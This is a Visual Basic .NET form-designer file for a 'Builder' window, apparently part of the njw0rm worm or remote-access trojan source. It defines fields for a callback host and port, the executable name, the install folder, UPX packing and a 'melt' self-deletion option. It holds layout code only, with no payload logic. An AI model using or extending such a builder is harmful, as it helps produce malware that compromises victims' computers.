<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form2
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.host = New System.Windows.Forms.TextBox
        Me.nam = New System.Windows.Forms.TextBox
        Me.Label2 = New System.Windows.Forms.Label
        Me.exe = New System.Windows.Forms.TextBox
        Me.Label3 = New System.Windows.Forms.Label
        Me.Label4 = New System.Windows.Forms.Label
        Me.dir = New System.Windows.Forms.ComboBox
        Me.port = New System.Windows.Forms.NumericUpDown
        Me.comp = New System.Windows.Forms.ComboBox
        Me.Label5 = New System.Windows.Forms.Label
        Me.ico = New System.Windows.Forms.Button
        Me.Button2 = New System.Windows.Forms.Button
        Me.Label1 = New System.Windows.Forms.Label
        Me.CheckBox1 = New System.Windows.Forms.CheckBox
        CType(Me.port, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'host
        '
        Me.host.BackColor = System.Drawing.Color.Black
        Me.host.ForeColor = System.Drawing.Color.IndianRed
        Me.host.Location = New System.Drawing.Point(3, 16)
        Me.host.Name = "host"
        Me.host.Size = New System.Drawing.Size(112, 20)
        Me.host.TabIndex = 1
        Me.host.Text = "127.0.0.1"
        '
        'nam
        '
        Me.nam.BackColor = System.Drawing.Color.Black
        Me.nam.ForeColor = System.Drawing.Color.IndianRed
        Me.nam.Location = New System.Drawing.Point(3, 54)
        Me.nam.Name = "nam"
        Me.nam.Size = New System.Drawing.Size(183, 20)
        Me.nam.TabIndex = 3
        Me.nam.Text = "w0rm1"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(0, 38)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(34, 13)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "Name"
        '
        'exe
        '
        Me.exe.BackColor = System.Drawing.Color.Black
        Me.exe.ForeColor = System.Drawing.Color.IndianRed
        Me.exe.Location = New System.Drawing.Point(3, 91)
        Me.exe.Name = "exe"
        Me.exe.Size = New System.Drawing.Size(183, 20)
        Me.exe.TabIndex = 5
        Me.exe.Text = "njw0rm.exe"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(0, 75)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(25, 13)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "Exe"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(0, 113)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(20, 13)
        Me.Label4.TabIndex = 6
        Me.Label4.Text = "Dir"
        '
        'dir
        '
        Me.dir.BackColor = System.Drawing.Color.Black
        Me.dir.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.dir.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.dir.ForeColor = System.Drawing.Color.IndianRed
        Me.dir.FormattingEnabled = True
        Me.dir.Items.AddRange(New Object() {"temp", "userprofile", "appdata", "windir", "programdata", "programfiles"})
        Me.dir.Location = New System.Drawing.Point(3, 129)
        Me.dir.Name = "dir"
        Me.dir.Size = New System.Drawing.Size(183, 21)
        Me.dir.TabIndex = 7
        '
        'port
        '
        Me.port.BackColor = System.Drawing.Color.Black
        Me.port.ForeColor = System.Drawing.Color.IndianRed
        Me.port.Location = New System.Drawing.Point(121, 16)
        Me.port.Maximum = New Decimal(New Integer() {64444, 0, 0, 0})
        Me.port.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.port.Name = "port"
        Me.port.Size = New System.Drawing.Size(65, 20)
        Me.port.TabIndex = 8
        Me.port.Value = New Decimal(New Integer() {1888, 0, 0, 0})
        '
        'comp
        '
        Me.comp.BackColor = System.Drawing.Color.Black
        Me.comp.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.comp.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.comp.ForeColor = System.Drawing.Color.IndianRed
        Me.comp.FormattingEnabled = True
        Me.comp.Items.AddRange(New Object() {"No Compress", "1", "2", "3", "4"})
        Me.comp.Location = New System.Drawing.Point(201, 30)
        Me.comp.Name = "comp"
        Me.comp.Size = New System.Drawing.Size(112, 21)
        Me.comp.TabIndex = 10
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(198, 14)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(84, 13)
        Me.Label5.TabIndex = 9
        Me.Label5.Text = "Compress [UPX]"
        '
        'ico
        '
        Me.ico.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.ico.Location = New System.Drawing.Point(201, 75)
        Me.ico.Name = "ico"
        Me.ico.Size = New System.Drawing.Size(112, 36)
        Me.ico.TabIndex = 13
        Me.ico.Text = "Icon"
        Me.ico.UseVisualStyleBackColor = True
        '
        'Button2
        '
        Me.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button2.Location = New System.Drawing.Point(201, 117)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(112, 33)
        Me.Button2.TabIndex = 14
        Me.Button2.Text = "Build"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(0, 2)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(29, 13)
        Me.Label1.TabIndex = 15
        Me.Label1.Text = "Host"
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.CheckBox1.Location = New System.Drawing.Point(201, 54)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(48, 17)
        Me.CheckBox1.TabIndex = 16
        Me.CheckBox1.Text = "MELT"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'Form2
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(320, 159)
        Me.Controls.Add(Me.CheckBox1)
        Me.Controls.Add(Me.Button2)
        Me.Controls.Add(Me.ico)
        Me.Controls.Add(Me.comp)
        Me.Controls.Add(Me.Label5)
        Me.Controls.Add(Me.port)
        Me.Controls.Add(Me.dir)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.exe)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.nam)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.host)
        Me.Controls.Add(Me.Label1)
        Me.ForeColor = System.Drawing.Color.IndianRed
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.MaximizeBox = False
        Me.Name = "Form2"
        Me.Text = "Builder"
        CType(Me.port, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents host As System.Windows.Forms.TextBox
    Friend WithEvents nam As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents exe As System.Windows.Forms.TextBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents dir As System.Windows.Forms.ComboBox
    Friend WithEvents port As System.Windows.Forms.NumericUpDown
    Friend WithEvents comp As System.Windows.Forms.ComboBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents ico As System.Windows.Forms.Button
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
End Class
